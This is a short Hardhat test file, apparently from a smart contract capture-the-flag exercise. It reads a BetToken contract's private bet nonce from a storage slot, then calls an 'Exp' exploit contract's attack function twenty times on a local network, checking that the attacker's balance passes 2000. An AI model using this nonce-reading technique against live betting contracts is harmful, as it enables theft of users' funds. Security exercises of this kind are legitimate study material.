import { expect } from "chai";
import { BigNumber } from "ethers";
import { formatEther } from "ethers/lib/utils";
import { deployments, ethers, network } from "hardhat";
import { BetToken, Exp } from "../typechain-types";

describe("Exp", function () {
  const setup = async () => {
    await deployments.fixture()
    const betToken = await ethers.getContract('BetToken') as BetToken
    const exp = await ethers.getContract('Exp') as Exp
    return {
      betToken,
      exp,
      getBetNonce: async () => {
        return BigNumber.from(await ethers.provider.getStorageAt(betToken.address, 2))
      },
      nextBlock: async () => {
        await network.provider.send("evm_increaseTime", [12])
        await network.provider.send("evm_mine")
      },
      getBalance: async (address: string) => {
        return await betToken.balances(address);
      },
      subAddress: await exp.subAddress()
    }
  }

  it("attack", async function () {
    const {exp, getBetNonce,nextBlock,getBalance,subAddress } = await setup()
    const nonce = await getBetNonce()
    console.log("addr", subAddress)
    const hacker = (await ethers.getUnnamedSigners())[1]
    let max = 20;
    while(max-- > 0){
      await nextBlock()
      await (await exp.connect(hacker).attack(await getBetNonce())).wait()
    }
    expect(await getBalance(subAddress),"you not win").to.gt(2000)
  });
});
